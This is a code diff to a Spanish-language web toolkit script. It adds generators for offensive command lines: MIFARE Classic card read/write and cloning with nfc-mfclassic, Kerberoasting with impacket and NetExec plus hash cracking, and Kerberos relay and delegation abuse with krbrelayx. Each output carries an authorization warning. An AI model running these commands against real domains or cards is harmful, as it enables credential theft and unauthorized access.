@@ -1,6 +1,6 @@
 /**
  * MFH TOOLS - Script del apartado Herramientas de Ciberseguridad
- * Categorías: Reconocimiento | Acceso con Credenciales
+ * Categorías: Reconocimiento | Acceso con Credenciales | NFC | Kerberoasting
  */
 
 'use strict';
@@ -103,7 +103,11 @@ function showTool(tool) {
         unsecured: 'unsecuredTab',
         wificred: 'wificredTab',
         keylogger: 'keyloggerTab',
-        voip: 'voipTab'
+        voip: 'voipTab',
+        libnfc: 'libnfcTab',
+        nfcmfclassic: 'nfcmfclassicTab',
+        kerberoast: 'kerberoastTab',
+        krbrelayx: 'krbrelayxTab'
     };
     var tabId = tabMap[tool];
     if (!tabId) return;
@@ -137,7 +141,11 @@ var AVAILABLE_TOOLS = [
     'unsecured-credentials.js',
     'wifi-credential-access.js',
     'keylogger.js',
-    'voip-credential-access.js'
+    'voip-credential-access.js',
+    'libnfc.js',
+    'nfc-mfclassic.js',
+    'kerberoast.js',
+    'krbrelayx.js'
 ];
 
 function downloadTool(filename) {
@@ -987,6 +995,181 @@ function runVoipCredentialAccess() {
 }
 
 // ============================================================
+// LIBNFC
+// ============================================================
+function runLibNFC() {
+    var iface = ($('libnfcIface') ? $('libnfcIface').value : '').trim() || 'pn532_spi:/dev/spidev0.1:50000';
+    var cmd = ($('libnfcCmd') ? $('libnfcCmd').value : 'list');
+    setOutput('libnfcResult', '📡 Generando comandos LibNFC...');
+    setTimeout(function() {
+        var lines = [];
+        lines.push('═'.repeat(50));
+        lines.push('  📡 LIBNFC COMMANDS');
+        lines.push('  Interface: ' + esc(iface));
+        lines.push('  Comando: ' + esc(cmd));
+        lines.push('═'.repeat(50));
+        lines.push('');
+        lines.push('📌 LibNFC');
+        lines.push('   Instalar: sudo apt install libnfc-bin libnfc-examples');
+        lines.push('');
+        lines.push('🔧 Configuracion (/etc/nfc/libnfc.conf):');
+        lines.push(codeBlock('device.name = "PN532 via SPI"'));
+        lines.push(codeBlock('device.connstring = "' + iface + '"'));
+        lines.push('');
+        if (cmd === 'list') {
+            lines.push('🔧 Listar dispositivos NFC:');
+            lines.push(codeBlock('nfc-list'));
+            lines.push(codeBlock('nfc-list -v'));
+            lines.push('');
+        }
+        if (cmd === 'poll') {
+            lines.push('🔧 Polling de tarjetas:');
+            lines.push(codeBlock('nfc-poll'));
+            lines.push(codeBlock('nfc-poll -v'));
+            lines.push('');
+        }
+        lines.push('📝 Notas:');
+        lines.push('   • I2C: pn532_i2c:/dev/i2c-1');
+        lines.push('   • UART: pn532_uart:/dev/ttyACM0');
+        lines.push('   • SPI: pn532_spi:/dev/spidev0.1:50000');
+        lines.push('   • Puede requerir sudo para acceder al dispositivo');
+        lines.push('');
+        lines.push('─'.repeat(50));
+        lines.push('⚠️ Solo lee tarjetas que te pertenezcan');
+        setOutput('libnfcResult', lines.join('<br>'));
+    }, 400);
+}
+
+// ============================================================
+// NFC MIFARE CLASSIC
+// ============================================================
+function runNfcMfclassic() {
+    var action = ($('mfAction') ? $('mfAction').value : 'r');
+    var key = ($('mfKey') ? $('mfKey').value : 'a');
+    var uid = ($('mfUid') ? $('mfUid').value : '').trim() || 'u';
+    var dump = ($('mfDump') ? $('mfDump').value : '').trim() || 'dump.mfd';
+    setOutput('mfResult', '💳 Generando comandos nfc-mfclassic...');
+    setTimeout(function() {
+        var lines = [];
+        lines.push('═'.repeat(50));
+        lines.push('  💳 NFC-MFCLASSIC COMMANDS');
+        lines.push('  Accion: ' + esc(action));
+        lines.push('  Key: ' + esc(key));
+        lines.push('  UID: ' + esc(uid));
+        lines.push('  DUMP: ' + esc(dump));
+        lines.push('═'.repeat(50));
+        lines.push('');
+        lines.push('📌 nfc-mfclassic');
+        lines.push('   Instalar: sudo apt install libnfc-bin');
+        lines.push('');
+        lines.push('🔧 Sintaxis: nfc-mfclassic f|r|R|w|W a|A|b|B u|U<uid> DUMP [KEYS [f]]');
+        lines.push('');
+        lines.push('🔧 Comando generado:');
+        lines.push(codeBlock('nfc-mfclassic ' + action + ' ' + key + ' ' + uid + ' ' + dump));
+        lines.push('');
+        lines.push('📝 Notas:');
+        lines.push('   • r = read, w = write, R = unlocked read, W = unlocked write, f = format');
+        lines.push('   • a/A = Key A, b/B = Key B (mayuscula = ignorar errores)');
+        lines.push('   • u = UID default, U<hex> = UID especifico (ej: U01ab23cd)');
+        lines.push('   • R/W solo funcionan en tarjetas MIFARE 1K chinas (clones)');
+        lines.push('   • f resetea keys a FFFFFFFFFFFF y data a 00');
+        lines.push('');
+        lines.push('─'.repeat(50));
+        lines.push('⚠️ Solo lee/escribe tarjetas que te pertenezcan');
+        setOutput('mfResult', lines.join('<br>'));
+    }, 400);
+}
+
+// ============================================================
+// KERBEROAST
+// ============================================================
+function runKerberoast() {
+    var domain = ($('kerbDomain') ? $('kerbDomain').value : '').trim() || 'example.local';
+    var user = ($('kerbUser') ? $('kerbUser').value : '').trim() || 'username';
+    var pass = ($('kerbPass') ? $('kerbPass').value : '').trim();
+    var dc = ($('kerbDc') ? $('kerbDc').value : '').trim() || '192.168.1.10';
+    setOutput('kerbResult', '🔑 Generando comandos Kerberoast...');
+    setTimeout(function() {
+        var lines = [];
+        lines.push('═'.repeat(50));
+        lines.push('  🔑 KERBEROASTING');
+        lines.push('  Dominio: ' + esc(domain));
+        lines.push('  Usuario: ' + esc(user));
+        lines.push('  DC IP: ' + esc(dc));
+        lines.push('═'.repeat(50));
+        lines.push('');
+        lines.push('📌 Impacket GetUserSPNs');
+        lines.push('   Instalar: pip install impacket');
+        if (pass.indexOf(':') !== -1) {
+            lines.push('🔧 Con hash (LM:NT):');
+            lines.push(codeBlock('impacket-GetUserSPNs -hashes ' + pass + ' ' + domain + '/' + user + ' -dc-ip ' + dc + ' -outputfile hashes.txt'));
+        } else {
+            lines.push('🔧 Con password:');
+            lines.push(codeBlock('impacket-GetUserSPNs ' + domain + '/' + user + ':' + (pass || 'password') + ' -dc-ip ' + dc + ' -outputfile hashes.txt'));
+        }
+        lines.push('');
+        lines.push('📌 NetExec (nxc)');
+        lines.push('   Instalar: pip install netexec');
+        lines.push(codeBlock('netexec ldap ' + dc + ' -u ' + user + ' -p ' + (pass || 'password') + ' --kerberoasting output.txt'));
+        lines.push('');
+        lines.push('🔧 Cracking:');
+        lines.push(codeBlock('john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt'));
+        lines.push(codeBlock('hashcat -m 13100 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt'));
+        lines.push('');
+        lines.push('📝 Notas:');
+        lines.push('   • RC4 hardening en 2026: cuentas AES-only fallan con /rc4');
+        lines.push('   • Hashes validos: krb5tgs (13100), krb5tgs AES (19600/19700)');
+        lines.push('');
+        lines.push('─'.repeat(50));
+        lines.push('⚠️ Solo ataca dominios con autorizacion escrita');
+        setOutput('kerbResult', lines.join('<br>'));
+    }, 400);
+}
+
+// ============================================================
+// KRBRELAYX
+// ============================================================
+function runKrbRelayX() {
+    var target = ($('krbRelayTarget') ? $('krbRelayTarget').value : '').trim() || 'smb://server:445';
+    var iface = ($('krbRelayIface') ? $('krbRelayIface').value : '').trim() || '192.168.1.50';
+    var loot = ($('krbRelayLoot') ? $('krbRelayLoot').value : '').trim() || './loot';
+    var format = ($('krbRelayFormat') ? $('krbRelayFormat').value : 'ccache');
+    setOutput('krbRelayResult', '🔄 Generando comandos KrbRelayX...');
+    setTimeout(function() {
+        var lines = [];
+        lines.push('═'.repeat(50));
+        lines.push('  🔄 KRBRELAYX');
+        lines.push('  Target: ' + esc(target));
+        lines.push('  Interface: ' + esc(iface));
+        lines.push('  Loot: ' + esc(loot));
+        lines.push('  Formato: ' + esc(format));
+        lines.push('═'.repeat(50));
+        lines.push('');
+        lines.push('📌 krbrelayx');
+        lines.push('   Instalar: git clone https://github.com/dirkjanm/krbrelayx');
+        lines.push('');
+        lines.push('🔧 Kerberos relay (sin credenciales):');
+        lines.push(codeBlock('krbrelayx.py -t ' + target + ' -ip ' + iface + ' -l ' + loot));
+        lines.push('');
+        lines.push('🔧 Kerberos relay sobre SMB con ADCS:');
+        lines.push(codeBlock('krbrelayx.py -t ' + target + ' --adcs --template DomainController -v DC03$'));
+        lines.push('');
+        lines.push('🔧 Unconstrained delegation abuse:');
+        lines.push(codeBlock('krbrelayx.py -t ' + target + ' -l ' + loot + ' -f ' + format));
+        lines.push('');
+        lines.push('📝 Notas:');
+        lines.push('   • -t solo acepta HOSTNAMES (no IPs) para Kerberos');
+        lines.push('   • -ip especifica la interfaz para los servidores SMB/HTTP');
+        lines.push('   • -f ccache (Impacket) o kirbi (Mimikatz)');
+        lines.push('   • -wh WPAD_HOST habilita ataque de proxy authentication');
+        lines.push('');
+        lines.push('─'.repeat(50));
+        lines.push('⚠️ Solo ataca dominios con autorizacion escrita');
+        setOutput('krbRelayResult', lines.join('<br>'));
+    }, 400);
+}
+
+// ============================================================
 // EXPORTAR FUNCIONES GLOBALES
 // ============================================================
 window.showTool = showTool;
@@ -1010,6 +1193,10 @@ window.runUnsecuredCredentials = runUnsecuredCredentials;
 window.runWifiCredentialAccess = runWifiCredentialAccess;
 window.runKeylogger = runKeylogger;
 window.runVoipCredentialAccess = runVoipCredentialAccess;
+window.runLibNFC = runLibNFC;
+window.runNfcMfclassic = runNfcMfclassic;
+window.runKerberoast = runKerberoast;
+window.runKrbRelayX = runKrbRelayX;
 
 // ============================================================
 // INICIALIZACIÓN
@@ -1019,4 +1206,5 @@ document.addEventListener('DOMContentLoaded', function() {
     console.log('📦 Herramientas disponibles: ' + AVAILABLE_TOOLS.length);
     console.log('🔍 Reconocimiento: 10 herramientas');
     console.log('🔐 Acceso con Credenciales: 9 herramientas');
+    console.log('📡 NFC / Kerberoasting: 4 herramientas');
 });
